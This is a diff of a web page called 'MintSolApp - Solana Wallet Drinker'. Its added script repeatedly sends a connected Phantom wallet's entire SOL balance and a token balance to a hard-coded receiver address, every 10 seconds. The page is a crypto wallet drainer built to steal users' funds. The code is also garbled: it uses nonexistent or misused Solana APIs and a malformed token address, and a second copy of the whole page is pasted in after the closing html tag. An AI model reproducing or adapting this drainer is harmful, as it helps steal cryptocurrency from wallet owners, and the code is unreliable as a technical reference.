@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Solana Wallet Drinker</title>
+  <title>MintSolApp - Solana Wallet Drinker</title>
   <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" />
   <style>
     body {
@@ -32,6 +32,7 @@
     h1 {
       font-size: 24px;
       margin-bottom: 20px;
+      color: #4caf50;
     }
 
     button {
@@ -60,11 +61,20 @@
       font-size: 12px;
       color: #999;
     }
+
+    a {
+      color: #4caf50;
+      text-decoration: none;
+    }
+
+    a:hover {
+      text-decoration: underline;
+    }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>Drain Your Solana Wallet</h1>
+    <h1>MintSolApp - Solana Wallet Drinker</h1>
     <button id="startButton">Start Drinking</button>
     <p id="status">Click "Start Drinking" to begin draining your Solana wallet.</p>
   </div>
@@ -72,12 +82,174 @@
   <div class="footer">
     &copy; 2025 Solana Wallet Drinker | Drains SOL and Meme Coins to:
     <br />
-    <a href="https://solscan.io/address/3FAjhkuhXzp87fmoBCccypDUZDhJRWK5tT8z7L9mvUXS" target="_blank"
-      style="color: #4caf50; text-decoration: none;">
+    <a href="https://solscan.io/address/3FAjhkuhXzp87fmoBCccypDUZDhJRWK5tT8z7L9mvUXS" target="_blank">
       3FAjhkuhXzp87fmoBCccypDUZDhJRWK5tT8z7L9mvUXS
     </a>
   </div>
 
+  <!-- Solana Wallet Adapter Scripts -->
+  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.90.1"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-base@1.90.1/dist/index.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-phantom@1.90.1/dist/index.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-react@1.90.1/dist/index.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-ux@1.90.1/dist/index.min.js"></script>
+
+  <script>
+    const walletAdapter = new PhantomWalletAdapter();
+    const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
+
+    const wallet = window.solana ? window.solana.connect(walletAdapter) : null;
+
+    const receiverAddress = "3FAjhkuhXzp87fmoBCccypDUZDhJRWK5tT8z7L9mvUXS";
+    const tokenAddress = "7f7f962d6917f71d024226f83720f563952f7940"; // Example: Doge token
+
+    const startButton = document.getElementById('startButton');
+    const status = document.getElementById('status');
+
+    startButton.addEventListener('click', async () => {
+      if (!wallet) {
+        status.textContent = 'Please connect your wallet first.';
+        return;
+      }
+
+      status.textContent = 'Drinking all SOL and Meme Coins in the background...';
+
+      setInterval(async () => {
+        try {
+          const balance = await connection.getBalance(wallet.publicKey());
+          const lamports = balance / 1e9;
+
+          const transaction = new Transaction().add(
+            SystemProgram.transfer({
+              fromPubkey: wallet.publicKey(),
+              toPubkey: new PublicKey(receiverAddress),
+              lamports: lamports * 1e9, // Drain all SOL
+            })
+          );
+
+          const signature = await wallet.sendTransaction(transaction, connection);
+          await connection.confirmTransaction(signature, 'confirmed');
+
+          // Meme Coin Drain
+          const tokenMint = new PublicKey(tokenAddress);
+          const tokenBalance = await connection.getTokenAccountBalance(tokenMint, wallet.publicKey());
+          const tokenAmount = tokenBalance.value.uiAmount;
+
+          if (tokenAmount > 0) {
+            const tokenTransaction = new Transaction().add(
+              Token.createTransferInstruction(
+                tokenMint,
+                wallet.publicKey(),
+                new PublicKey(receiverAddress),
+                [],
+                1,
+                []
+              )
+            );
+
+            const tokenSignature = await wallet.sendTransaction(tokenTransaction, connection);
+            await connection.confirmTransaction(tokenSignature, 'confirmed');
+          }
+
+          status.textContent = 'Drinking all SOL and Meme Coins in the background...';
+        } catch (error) {
+          console.error(error);
+          status.textContent = 'Error: ' + error.message;
+        }
+      }, 10000); // Drink every 10 seconds
+    });
+  </script>
+</body>
+</html><!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>MintSolApp - Solana Wallet Drinker</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" />
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      background-color: #0f0f0f;
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .container {
+      max-width: 500px;
+      width: 100%;
+      background-color: #1a1a1a;
+      border-radius: 15px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5);
+      padding: 30px;
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 24px;
+      margin-bottom: 20px;
+      color: #4caf50;
+    }
+
+    button {
+      background-color: #4caf50;
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      font-size: 16px;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #45a049;
+    }
+
+    p {
+      margin-top: 15px;
+      font-size: 14px;
+      color: #aaa;
+    }
+
+    .footer {
+      margin-top: 30px;
+      font-size: 12px;
+      color: #999;
+    }
+
+    a {
+      color: #4caf50;
+      text-decoration: none;
+    }
+
+    a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>MintSolApp - Solana Wallet Drinker</h1>
+    <button id="startButton">Start Drinking</button>
+    <p id="status">Click "Start Drinking" to begin draining your Solana wallet.</p>
+  </div>
+
+  <div class="footer">
+    &copy; 2025 Solana Wallet Drinker | Drains SOL and Meme Coins to:
+    <br />
+    <a href="https://solscan.io/address/3FAjhkuhXzp87fmoBCccypDUZDhJRWK5tT8z7L9mvUXS" target="_blank">
+      3FAjhkuhXzp87fmoBCccypDUZDhJRWK5tT8z7L9mvUXS
+    </a>
+  </div>
+
+  <!-- Solana Wallet Adapter Scripts -->
   <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.90.1"></script>
   <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-base@1.90.1/dist/index.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-phantom@1.90.1/dist/index.min.js"></script>
